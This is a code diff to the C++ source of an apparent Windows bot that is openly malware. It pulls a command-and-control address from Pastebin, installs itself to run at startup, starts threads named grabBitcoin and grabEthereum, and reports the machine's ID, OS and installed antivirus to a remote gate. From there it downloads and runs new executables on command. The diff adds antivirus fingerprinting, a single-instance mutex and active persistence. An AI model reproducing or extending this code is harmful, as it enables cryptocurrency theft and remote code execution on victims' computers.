@@ -14,6 +14,9 @@
 #include <conio.h>
 #include "CoinFinder.h"
 #include <atlbase.h>
+#include <wtypes.h>
+#include <comutil.h>
+#pragma comment(lib,"comsuppw.lib")
 #pragma comment( lib, "Urlmon.lib" )
 #pragma comment(lib, "netapi32.lib")
 #pragma comment(lib,"wbemuuid")
@@ -49,7 +52,6 @@ std::string getComputerName() {
 	return(strRetVal);
 }
 
-
 std::string downloadFile(std::string url, std::string file) {
 	const char* strUrl = url.c_str();
 	const char* strFile = file.c_str(); // I had been testing with these, not currently using them
@@ -59,6 +61,7 @@ std::string downloadFile(std::string url, std::string file) {
 	}
 	return "ok";
 }
+
 std::vector<std::string> explode(const std::string& delimiter, const std::string& str) {
 	std::vector<std::string> arr;
 	int strleng = str.length();
@@ -105,9 +108,6 @@ std::string RandomString(int len) {
 	return newstr;
 }
 
-
-
-
 std::string startNewProcess(std::string file) {
 	STARTUPINFO si = {};
 	si.cb = sizeof si;
@@ -115,7 +115,6 @@ std::string startNewProcess(std::string file) {
 	PROCESS_INFORMATION pi = {};
 	const TCHAR* target = TEXT(file.c_str());
 	
-
 	if (!CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi))
 	{
 		std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
@@ -207,7 +206,6 @@ std::string GetWindowsVersionString() {
 	return winver;
 }
 
-
 void addstartup()
 {
 	TCHAR path[100];
@@ -222,6 +220,7 @@ std::string ExePath() {
 	char result[MAX_PATH];
 	return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
 }
+
 std::string ExeDir() {
 	char buffer[MAX_PATH];
 	GetModuleFileName(NULL, buffer, MAX_PATH);
@@ -254,7 +253,6 @@ void uninstall() {
 	//system(remove.c_str());
 }
 
-
 void update(std::string url) {
 	std::string file((std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe");
 	downloadFile(url, file);
@@ -273,7 +271,6 @@ std::string checkIfRegKeyExists(std::string key) {
 	}
 	return "true";
 }
-
 
 std::string GetMachineGUID()
 {
@@ -313,15 +310,14 @@ std::string installedOrnot() {
 		return "restart";
 	}
 }
-std::string& BstrToStdString(const BSTR bstr, std::string& dst, int cp = CP_UTF8)
-{
+
+std::string& BstrToStdString(const BSTR bstr, std::string& dst, int cp = CP_UTF8){
 	if (!bstr)
 	{
 		// define NULL functionality. I just clear the target.
 		dst.clear();
 		return dst;
 	}
-
 	// request content length in single-chars through a terminating
 	//  nullchar in the BSTR. note: BSTR's support imbedded nullchars,
 	//  so this will only convert through the first nullchar.
@@ -338,8 +334,16 @@ std::string& BstrToStdString(const BSTR bstr, std::string& dst, int cp = CP_UTF8
 	return dst;
 }
 
+std::string bstr_to_str(BSTR source) {
+	//source = L"lol2inside";
+	_bstr_t wrapped_bstr = _bstr_t(source);
+	int length = wrapped_bstr.length();
+	char* char_array = new char[length];
+	strcpy_s(char_array, length + 1, wrapped_bstr);
+	return char_array;
+}
 
-std::string avList() {
+std::string getCurrentAv() {
 
 	std::string returnString;
 	CoInitializeEx(0, 0);
@@ -349,25 +353,24 @@ std::string avList() {
 	IWbemServices * services = 0;
 	wchar_t *name = L"root\\SecurityCenter2";
 	if (SUCCEEDED(locator->ConnectServer(name, 0, 0, 0, 0, 0, 0, &services))) {
-		printf("Connected!\n");
+		//printf("Connected!\n");
 		//Lets get system information
 		CoSetProxyBlanket(services, 10, 0, 0, 3, 3, 0, 0);
 		wchar_t *query = L"Select * From AntiVirusProduct";
 		IEnumWbemClassObject *e = 0;
 		if (SUCCEEDED(services->ExecQuery(L"WQL", query, WBEM_FLAG_FORWARD_ONLY, 0, &e))) {
-			printf("Query executed successfuly!\n");
+			//printf("Query executed successfuly!\n");
 			IWbemClassObject *object = 0;
 			ULONG u = 0;
 			//lets enumerate all data from this table
-
 			std::string antiVirus;
-
 			while (e) {
 				e->Next(WBEM_INFINITE, 1, &object, &u);
 				if (!u) break;//no more data,end enumeration
 				CComVariant cvtVersion;
 				object->Get(L"displayName", 0, &cvtVersion, 0, 0);
-				std::wcout << cvtVersion.bstrVal;
+				//std::wcout << cvtVersion.bstrVal;
+				returnString = bstr_to_str(cvtVersion.bstrVal);
 			}
 		}
 		else
@@ -379,7 +382,7 @@ std::string avList() {
 	services->Release();
 	locator->Release();
 	CoUninitialize();
-	_getch();
+	//_getch();
 
 	return returnString;
 }
@@ -394,24 +397,29 @@ std::string encryptDecrypt(std::string toEncrypt) {
 }
 
 
+
+
 //int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
 int main(int argc, char *argv[]) {
 	Config config;
 
+	//Check if the Bot is Running
+	CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
+	if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
+		return -1; // quit; mutex is released automatically
 
-	//std::string test = avList();
-	//std::cout << test;
-	/*
-	std::string insatlled = installedOrnot();
-	if (insatlled == "restart") {
-		std::cout << "restart program";
-		return 0;
+
+	//Autostart && Clone
+	if (config.startup == true) {
+		std::string insatlled = installedOrnot();
+		if (insatlled == "restart") {
+			return 0;
+		}
+		addstartup();
 	}
-	addstartup();
-	*/
 
 
-
+	//Main
 	http::Request request(config.pastebinUrl);
 	http::Response response = request.send("GET");
 	std::string gateFromPatebin = encryptDecrypt(responseToString(response));
@@ -419,7 +427,7 @@ int main(int argc, char *argv[]) {
 	std::string netFramework3 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
 	std::string netFramework35 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
 	std::string netFramework4 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
-
+	std::string currentAV = getCurrentAv();
 	std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
 	std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
 
@@ -433,18 +441,15 @@ int main(int argc, char *argv[]) {
 				"&nf3=" + encryptDecrypt(netFramework3) +
 				"&nf35=" + encryptDecrypt(netFramework35) +
 				"&nf4=" + encryptDecrypt(netFramework4) +
+				"&av=" + currentAV +
 				"&os=" + GetWindowsVersionString() +
 				"&botversion=" + encryptDecrypt("2.0"),
 				{ "Content-Type: application/x-www-form-urlencoded" }
 			);
 			std::string responseFromGate = responseToString(respons2e);
 			//TODO Handle Tasks Function
-			
-			//TODO Get Current AV
 			//Java Support?
 			//32x64 Bit CPU (&& Model?)
-			//Current AV?
-
 			std::cout << responseFromGate;
 			std::string substring = "newtask";
 			if (responseFromGate.find(substring) != std::string::npos) {
@@ -466,11 +471,15 @@ int main(int argc, char *argv[]) {
 				std::cout << started;
 			} else {
 				if (responseFromGate.find("uninstall") != std::string::npos) {
+					t1.detach();
+					t2.detach();
 					uninstall();
 					return 0;
 				}  else if (responseFromGate.find("update") != std::string::npos) {
 					std::cout << "Update Found  \n";
 					std::vector<std::string> v = explode(";", responseFromGate);
+					t1.detach();
+					t2.detach();
 					update(v[2]);
 					return 0;
 				}else {
